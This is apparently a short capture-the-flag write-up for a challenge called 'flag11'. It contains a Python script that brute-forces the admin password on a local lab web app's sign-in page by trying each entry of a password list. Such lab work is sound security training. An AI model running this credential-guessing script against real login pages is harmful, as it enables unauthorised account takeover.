# flag11 | bruteforce

We will create a python script that will use a list of password to try to connect to http://192.168.56.104/?page=signin&username=....&password=....&Login=Login

```python
import requests
import sys

url = "http://192.168.56.104/?page=signin&username=admin&password={}&Login=Login"

with open("passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        r = requests.get(url.format(password))
        if "flag" in r.text:
            print("Password found: {}".format(password))
            sys.exit(0)
```